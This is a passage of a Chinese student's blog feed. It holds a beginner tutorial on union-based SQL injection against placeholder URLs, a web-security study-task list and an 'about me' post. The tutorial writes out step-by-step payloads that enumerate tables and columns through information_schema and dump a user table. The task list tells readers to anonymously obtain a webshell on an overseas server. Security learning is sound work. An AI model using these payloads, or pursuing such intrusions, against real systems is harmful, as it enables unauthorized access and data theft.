title="1.判断是否可以注入"></a>1.判断是否可以注入</h4><p>如果要对一个网站进行SQL注入攻击，首先就需要找到存在SQL注入漏洞的地方，也就是寻找所谓的注入点。可能的SQL注入点一般存在于登录页面、查找页面或添加页面等用户可以查找或修改数据的地方（我单纯的认为SQL注入点就是我们可以注释掉一部分SQL查询语句，并且在浏览器界面修改查询语句，利用数据库报错，来寻找能够利用的信息)<br>最常用的寻找SQL注入点的方法，是在网站中寻找如下形式的页面链接： </p><blockquote><p><a href="http://www.xxx.com/xxx.asp?id=YY--+">http://www.xxx.com/xxx.asp?id=YY--+</a></p></blockquote><p>其中“YY”可能是数字，也有可能是字符串，分别被称为整数（数字）类型数据或者字符型数据。在本章中我们主要针对整数型数据进行SQL注入讲解。（我暂时粗浅的认识是字符型注入和数字型注入区别在于id值后面是否用单引号包住，字符型需要，数字型不需要）</p><p>　　通常可以使用以下两种方法进行检测，判断该页面链接是否存在SQL注入漏洞。  </p><h5 id="（1）“加引号”法"><a href="#（1）“加引号”法" class="headerlink" title="（1）“加引号”法"></a>（1）“加引号”法</h5><p>在浏览器地址栏中的页面链接地址后面增加一个单引号，如下所示：</p><blockquote><p><a href="http://www.xxx.com/xxx.asp?id=YY%E2%80%99--+">http://www.xxx.com/xxx.asp?id=YY’--+</a></p></blockquote><p>由于单引号在SQL语句中起闭合语句的作用，相当于yy后面会出现两个单引号，一个是人为添加的，一个是SQL语句中自带的，所以会导致SQL语句语法错误，网页无法显示，所以存在SQL注入点。  </p><h5 id="（2）“1-1和1-2”法"><a href="#（2）“1-1和1-2”法" class="headerlink" title="（2）“1=1和1=2”法"></a>（2）“1=1和1=2”法</h5><p>在浏览器地址栏中的网页链接地址后面增加分别增加and 1=1 和and 1=2，如下所示：   </p><blockquote><p><a href="http://www.xxx.com/xxx.asp?id=YY">http://www.xxx.com/xxx.asp?id=YY</a> and 1=1–+<br><a href="http://www.xxx.com/xxx.asp?id=YY">http://www.xxx.com/xxx.asp?id=YY</a> and 1=2–+ </p></blockquote><p>其中的–+意思是注释掉后面的SQL语句，防止出现语法错误（由于这次针对整型，所以id值后面没有添加单引号），这两个语句相当于给SQL增加了一个判定条件，and表示并，相信大家高中的时候都学过并集，只有当and左右两边都是正确的，答案才会正确（即页面显示正常），显然id=YY是正确的，那么只需要判定and后面的就可以了，1=1显然正确，所以页面正常，1=2反之，所以也可以说明存在SQL注入点。 </p><h4 id="2-获得字段数"><a href="#2-获得字段数" class="headerlink" title="2.获得字段数"></a>2.获得字段数</h4><p>这里就要讲到sql的order by子句了<br>微软解释order by子句：为select查询的列排序，如果同时制定了top关键词，order by子句在视图、内联函数、派生表和子查询中无效。<br>攻击者往往会注入order by子句来判断此表的列数（字段数）<br><img src="https://wx1.sinaimg.cn/mw1024/0072g83Qgy1fn7202npodj31kw0o67wi.jpg" alt="order by子句"><br>通过数据库抛出异常，我们已经可以知道当前的SQL语句有几列存在了。<br>在这里我们一般在网页链接地址后面增加order by加数字来猜出列数，如下所示： </p><blockquote><p><a href="http://www.xxx.com/xxx.asp?id=YY">http://www.xxx.com/xxx.asp?id=YY</a> order by 3  –+</p></blockquote><p>通过不断地一次改变数字，看是否页面显示异常，来获得字段数。 </p><h4 id="3-获得显示位"><a href="#3-获得显示位" class="headerlink" title="3.获得显示位"></a>3.获得显示位</h4><p>这里我们要了解到SQL语句中的联合查询（union select百度百科：联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为UNION或UNION ALL。）<br>这里的显示位就是能够在网页上直接可以看见的数据显示处，一般在网页链接后面加union select加你上一步获得的字段数从1开始依次排序，如下所示：  </p><blockquote><p><a href="http://www.xxx.com/xxx.asp?id=YY">http://www.xxx.com/xxx.asp?id=YY</a> union select 1,2,3  </p></blockquote><p>然后我们正常情况下会看见页面上会出现1,2,3三个字段数，说明已经获得显示位了，接下来我们就可以利用SQL注入在在几个显示位上获得我们想要的信息了。</p><h4 id="4-获取数据库信息"><a href="#4-获取数据库信息" class="headerlink" title="4.获取数据库信息"></a>4.获取数据库信息</h4><p>现在来介绍几个在渗透测试中常用的几个函数和表库名。</p><p>数据库名：database()</p><p>数据库版本： version()</p><p>数据库用户： user()</p><p>操作系统： @@version_compile_os</p><p>系统用户名： system_user()</p><p>当前用户名： current_user</p><p>连接数据库的用户名：session_user()</p><p>读取数据库路径：@@datadir</p><p>MYSQL安装路径：@@basedir</p><p>load_file 转成16进制或者10进制 MYSQL读取本地文件函数</p><p>into outfile 写入函数</p><p>储存所有表名信息的表 : information_schema.tables</p><p>表名 ： table_name</p><p>数据库名： table_schema</p><p>列名 ： column_name</p><p>储存所有列名信息的表 ： information_schema.columns<br>我们用一些我们想要了解的函数和数据库名代替之前的显位数（也就是上面一步的1,2,3），我们想要了解数据库名，版本和用户名，可以构造以下链接：</p><blockquote><p><a href="http://www.xxx.com/xxx.asp?id=YY">http://www.xxx.com/xxx.asp?id=YY</a> union select database(),version(),user() –+</p></blockquote><p>接着就可以在显示位上依次看到数据库名，数据库版本，用户名了，记住这些你想获取的信息。 </p><h4 id="5-获取当前数据库的表名"><a href="#5-获取当前数据库的表名" class="headerlink" title="5.获取当前数据库的表名"></a>5.获取当前数据库的表名</h4><p>这里我用到了一个函数GROUP_CONCAT()<br>GROUP_CONCAT函数返回一个字符串结果，该结果由分组中的值连接组合而成。这样我们就可以在一个显示位上获得多个表名，而不是用limit子句去一个一个遍历了。</p><blockquote><p><a href="http://www.xxx.com/xxx.asp?id=YY">http://www.xxx.com/xxx.asp?id=YY</a> union select group_concat(table_name),2,3 from<br>information_schema.tables where table_schema=0x73716C696E20 </p></blockquote><p>其中的information_schema这张数据表保存了MySQL服务器所有数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema表里面，我们在后面加上.tables就是存放了数据库中所有表名的元数据。后面的0x73716C696E20其实是当前数据库的hex值，我们可以通过一些网上在线的hex转码找到数据库名对应的hex值。<br>我们在网页显示位上可以看见我们想要的表名。</p><h4 id="6-获取列名"><a href="#6-获取列名" class="headerlink" title="6.获取列名"></a>6.获取列名</h4><p>假如我们选择了一个名叫user的表，那么我们就要开始从表中调取列名数据了，和上一步大同小异，我们构造如下URL：</p><blockquote><p><a href="http://www.xxx.com/xxx.asp?id=YY">http://www.xxx.com/xxx.asp?id=YY</a> union select group_concat(column_name),2,3 from<br>information_schema.columns where table_name=0x75736572 –+</p></blockquote><p>这样我们就获得了user表中的列名  </p><h4 id="7-爆数据"><a href="#7-爆数据" class="headerlink" title="7.爆数据"></a>7.爆数据</h4><p>这里假如我们想要获取username列中的数据</p><blockquote><p><a href="http://www.xxx.com/xxx.asp?id=YY">http://www.xxx.com/xxx.asp?id=YY</a> union select username,2,3 from user（表名） –+</p></blockquote><p>数据就出来了。<br><img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=3976043197,1350628331&fm=27&gp=0.jpg" alt="比心">  </p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>上面的总结只是我比较粗浅的理解，也借鉴了一些网上的教程，如有错误多多包涵。当然这只是最最基本的get注入，还有什么cookie注入、post注入、宽字节注入、盲注、延时注入等，我还没有去深入了解，等我学了再说吧。<br><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=406614704,1320230518&fm=27&gp=0.jpg" alt="无能为力"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL注入基本步骤&quot;&gt;&lt;a href=&quot;#SQL注入基本步骤&quot; class=&quot;headerlink&quot; title=&quot;SQL注入基本步骤&quot;&gt;&lt;/a&gt;SQL注入基本步骤&lt;/h1&gt;&lt;h2 id=&quot;什么是SQL注入&quot;&gt;&lt;a href=&quot;#什么是SQL注入&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="技术" scheme="http://yoursite.com/child/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/child/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>web任务来了！！！</title>
    <link href="http://yoursite.com/child/2017/12/24/web%E4%BB%BB%E5%8A%A1%E6%9D%A5%E4%BA%86!!!!!!/"/>
    <id>http://yoursite.com/child/2017/12/24/web任务来了!!!!!!/</id>
    <published>2017-12-24T09:31:49.000Z</published>
    <updated>2018-02-27T04:21:18.769Z</updated>
    
    <content type="html"><![CDATA[<h2 id="知识管理🚩"><a href="#知识管理🚩" class="headerlink" title="知识管理🚩"></a>知识管理🚩</h2><ul><li>搭建自己的博客,推荐使用Github+Hexo.<ul><li><a href="https://github.com/limedroid/HexoLearning">https://github.com/limedroid/HexoLearning</a></li></ul></li><li>熟练使用markdown编写文档.<ul><li><a href="http://blog.leanote.com/post/freewalk/Markdown-%E8%AF%AD%E6%B3%95%E6%89%8B%E5%86%8C">http://blog.leanote.com/post/freewalk/Markdown-%E8%AF%AD%E6%B3%95%E6%89%8B%E5%86%8C</a></li></ul></li><li>使用云笔记(推荐为知笔记,有道云笔记,印象笔记)<a id="more"></a></li></ul><h2 id="代码审计🚩"><a href="#代码审计🚩" class="headerlink" title="代码审计🚩"></a>代码审计🚩</h2><p>了解常见web漏洞的原理,利用及修复.</p><ul><li>SQL注入<ul><li><a href="http://bobao.360.cn/learning/detail/3758.html">http://bobao.360.cn/learning/detail/3758.html</a></li><li><a href="http://websec.ca/kb/sql_injection">http://websec.ca/kb/sql_injection</a> </li></ul></li><li>文件包含<ul><li><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html">http://www.cnblogs.com/iamstudy/articles/include_file.html</a></li></ul></li><li>命令执行<ul><li><a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></li><li><a href="http://pupiles.com/shellcode.html">http://pupiles.com/shellcode.html</a></li></ul></li><li>代码注入<ul><li><a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/">https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/</a></li></ul></li></ul><p>(上面给的链接仅作参考,不是看几篇博客就完了🐸)</p><p>推荐书籍(必看👀):《白帽子讲web安全 》《代码审计:企业级web代码安全架构》</p><p>熟悉Linux下的常用操作,包括但不限于:</p><ul><li>了解概念</li></ul><ul><li>SSH配置</li><li>软件的安装及卸载</li><li>文件操作</li><li>lamp配置</li><li>shadowsocks配置</li><li>……</li></ul><p>推荐书籍: 《鸟哥的Linux私房菜-基础篇》</p><h2 id="渗透测试🚩"><a href="#渗透测试🚩" class="headerlink" title="渗透测试🚩"></a>渗透测试🚩</h2><p>熟悉Kali Linux下常用渗透测试工具的使用.</p><ul><li>SQLMAP</li><li>BurpSuite</li><li>NMAP</li></ul><p>了解常规渗透测试流程,掌握常用测试手段:</p><ul><li>信息收集</li><li>端口扫描</li><li>暴力破解</li><li>……</li></ul><p>尝试在隐藏身份的情况下,获取一台<strong>境外</strong>服务器的webshell.</p><h2 id="怎么学"><a href="#怎么学" class="headerlink" title="怎么学"></a>怎么学</h2><p>学习过程中最重要的是对<strong>原理</strong>的理解(Know it, then hack it),技术手段每天都更新,但原理是相通的.</p><p>我以”SQL注入”为栗,讲下我个人学习的一般思路.</p><ol><li><p>目标: 掌握SQL注入漏洞</p></li><li><p>收集相关资料(书籍,博客,paper等几乎所有能找到的),找出掌握该漏洞需要得基础知识</p><ul><li>PHP环境搭建</li><li>Mysql数据库</li><li>SQL语言</li><li>PHP编程</li><li>PHP + MYSQL程序设计</li></ul></li><li><p>掌握上面的基础之后(你可能又需要看几本书🙃),自己写出漏洞demo</p></li><li><p>利用漏洞demo分析漏洞产生的原理</p></li><li><p>熟悉该漏洞的各种利用</p><ul><li><p>联合查询</p></li><li><p>报错注入</p><ul><li>有哪些报错函数?原理分别是什么?</li></ul></li><li><p>布尔盲注/延时盲注</p><ul><li>区别是什么?分别在什么情况下使用?</li></ul></li><li><p>写webshell</p><ul><li>webshell是什么?</li><li>什么情况下能写shell?</li></ul></li><li><p>数据外带</p><ul><li>为什么要数据外带?</li><li>DNS又是什么鬼?</li></ul></li><li><p>有哪些现成的利用工具?</p><ul><li>sqlmap =&gt; 熟练使用</li></ul></li><li><p>如何用python编写注入脚本?</p><ul><li>python编程基础</li><li>所涉及的requests,re等模块的使用<ul><li>正则表达式以及往下的无限延伸😆</li></ul></li></ul></li></ul><p>“熟悉”的定义是我能随手写出各种注入的payload并且知道自己每一步在干嘛以及为什么要这样做.</p></li><li><p>常见防御情况下的绕过及各种trips,建议从各种<strong>CTF</strong>题里找案例来刷</p><ul><li>怎么找题? =&gt; google,github<ul><li>没法翻墙上google? =&gt; 学习vps下ss代理搭建<ul><li>linux不会用? =&gt; 学习linux下的各种操作</li></ul></li><li>不会用github? =&gt; 学习github的使用</li><li>什么还有docker这种搭环境的神器? =&gt; 学习docker的使用</li><li>以及往下的无限延伸😆…</li></ul></li><li>我能否总结出比网上更全的技巧?</li></ul></li><li><p>学习如何防御SQL注入</p></li></ol><ul><li>黑名单过滤</li><li>PDO查询</li><li>上述措施的代码实现</li></ul><ol start="8"><li><p>写出自己的学习总结/笔记(分享到博客会显得你很geek👍)</p></li><li><p>目标达成: 掌握SQL注入漏洞,在CTF比赛中不会畏惧这类题型,并且有信心解决它🤗.</p></li></ol><p>我比较推荐这种”蔓延式”的学习,这样你就永远不会不知道自己该学什么了🤣任何一个点都可以往下延伸出一个面</p><h2 id="给你们的任务❗❗❗"><a href="#给你们的任务❗❗❗" class="headerlink" title="给你们的任务❗❗❗"></a>给你们的任务❗❗❗</h2><p>完成上面3个小红旗下的所有要求,并写一份关于某<strong>一个</strong>你了解的最深入的漏洞的学习报告(请参考”怎么学”部分).</p><p><strong>时间</strong>: 寒假结束之前完成📆</p><h2 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h2><ol><li><p>看书!看书!看书!书上的知识是成体系的,强烈推荐下面几本入门书:</p><ul><li>《白帽子讲web安全 》</li><li>《代码审计:企业级web代码安全架构》</li><li>《安全之路:Web渗透技术及实战案例解析(第2版) 》</li></ul></li><li><p>各种安全新媒体/博客/微信公众号/论坛</p><ul><li><a href="https://www.secpulse.com/">安全脉搏</a></li></ul></li></ol><ul><li><p><a href="https://www.anquanke.com/">安全客</a></p></li><li><p><a href="http://www.freebuf.com/">freebuf</a></p><p>以及各个安全文章聚合网站,</p></li><li><p><a href="https://www.sec-wiki.com/">https://www.sec-wiki.com</a></p></li><li><p><a href="https://www.secdic.com/">https://www.secdic.com</a></p></li></ul><ol start="3"><li><p>社区论坛</p><ul><li><a href="https://xianzhi.aliyun.com/forum/">先知安全技术社区</a></li><li><a href="https://forum.90sec.org/">90sec</a></li><li><a href="https://www.t00ls.net/index.php">t00ls</a></li><li><a href="http://www.anquan.us/">wooyun知识库</a></li></ul></li><li><p>github</p><ul><li><a href="https://github.com/wonderkun/CTF_web">https://github.com/wonderkun/CTF_web</a></li><li><a href="https://github.com/CHYbeta/Code-Audit-Challenges">https://github.com/CHYbeta/Code-Audit-Challenges</a></li><li><a href="https://github.com/ctf-wiki/ctf-wiki">https://github.com/ctf-wiki/ctf-wiki</a></li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;知识管理🚩&quot;&gt;&lt;a href=&quot;#知识管理🚩&quot; class=&quot;headerlink&quot; title=&quot;知识管理🚩&quot;&gt;&lt;/a&gt;知识管理🚩&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;搭建自己的博客,推荐使用Github+Hexo.&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/limedroid/HexoLearning&quot;&gt;https://github.com/limedroid/HexoLearning&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;熟练使用markdown编写文档.&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.leanote.com/post/freewalk/Markdown-%E8%AF%AD%E6%B3%95%E6%89%8B%E5%86%8C&quot;&gt;http://blog.leanote.com/post/freewalk/Markdown-%E8%AF%AD%E6%B3%95%E6%89%8B%E5%86%8C&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用云笔记(推荐为知笔记,有道云笔记,印象笔记)
    
    </summary>
    
    
      <category term="技术" scheme="http://yoursite.com/child/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="学习历程" scheme="http://yoursite.com/child/tags/%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>关于我</title>
    <link href="http://yoursite.com/child/2017/12/24/%E5%85%B3%E4%BA%8E%E6%88%91/"/>
    <id>http://yoursite.com/child/2017/12/24/关于我/</id>
    <published>2017-12-24T09:31:49.000Z</published>
    <updated>2017-12-24T10:05:24.807Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>欢迎来到<a href="https://jas0nwhy.github.io/" title="一起来玩啊">我的博客</a>  </p><a id="more"></a><p>标签：刚刚入坑信息安全专业大学生<br>地点：四川成都<br>技术：什么都不会<br>搭建目的:分享学习历程(求大佬带带我)<br>QQ：1456450951  </p><h3 id="一些小想法"><a href="#一些小想法" class="headerlink" title="一些小想法"></a>一些小想法</h3><p>在高考之前从来没有听说过信息安全专业，也没有任何的有关学习经历。被信安专业录取以后，才开始对信安有了最初的概念，自己什么都不会，ctf、SQL注入、文件包含、抓包。。。<img src="https://gss0.baidu.com/9vo3dSag_xI4khGko9WTAnF6hhy/zhidao/wh%3D600%2C800/sign=a4204cb57bf082022dc799397bcbd7d5/810a19d8bc3eb1353a911f2dae1ea8d3fc1f44d5.jpg" alt="一脸懵逼"><br>后来想了一想，来都来了，还是要学一点的，正好有一个xx大挑战，去玩玩吧。。。<img src="https://ss0.baidu.com/6ONWsjip0QIZ8tyhnq/it/u=2177487654,1605171879&fm=58&bpow=258&bpoh=256" alt="一脸懵逼2"><br>结果一个月过去了只会签到题，蓝瘦香菇。一场比赛发现了周围周围全是大佬，我想我一定要向他们学习，好的，学学PHP吧，结果安装PHPstudy又搞三天才搞好（其实是自己傻，本来已经搞好了，因为www文件有一个helloworld.PHP，咦！显示效果和教程不一样诶，一直停在了那里没有反映过来）<br>再后来，在同寝室某大佬的指导下，开始做了一些ctf平台的题，好像开了一扇新的大门，感觉有点意思了，开始想去主动了解一些东西了，可是还是很菜，很多题都要看了write up才明白。<br>差不多一个学期要结束了，大学真的很忙，在搞好学习的同时，还要忙学生会、社团。剩下的一点点时间拿来学习技术，感觉学的非常杂乱，不知道自己该怎么去学了，这个时候看见xx小组招新了（可惜招新的时候去了重庆）<img src="http://u.candou.com/2017/0802/1501660799721.jpg" alt="日"><br>好吧，出了web任务了，还有一个寒假，好好学学，至少有一个大概的方向了，就这样吧。。。</p><p>如果有什么问题可以联系我的邮箱<a href="mailto:&#x31;&#x34;&#53;&#x36;&#x34;&#53;&#48;&#57;&#53;&#49;&#64;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#x31;&#x34;&#53;&#x36;&#x34;&#53;&#48;&#57;&#53;&#49;&#64;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a><img src="https://b-ssl.duitang.com/uploads/item/201704/09/20170409213006_43GBH.thumb.700_0.jpeg" alt="独自哭泣"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;关于我&quot;&gt;&lt;a href=&quot;#关于我&quot; class=&quot;headerlink&quot; title=&quot;关于我&quot;&gt;&lt;/a&gt;关于我&lt;/h2&gt;&lt;p&gt;欢迎来到&lt;a href=&quot;https://jas0nwhy.github.io/&quot; title=&quot;一起来玩啊&quot;&gt;我的博客&lt;/a&gt;  &lt;/p&gt;
    
    </summary>
    
    
      <category term="关于我" scheme="http://yoursite.com/child/tags/%E5%85%B3%E4%BA%8E%E6%88%91/"/>
    
  </entry>
  
</feed>
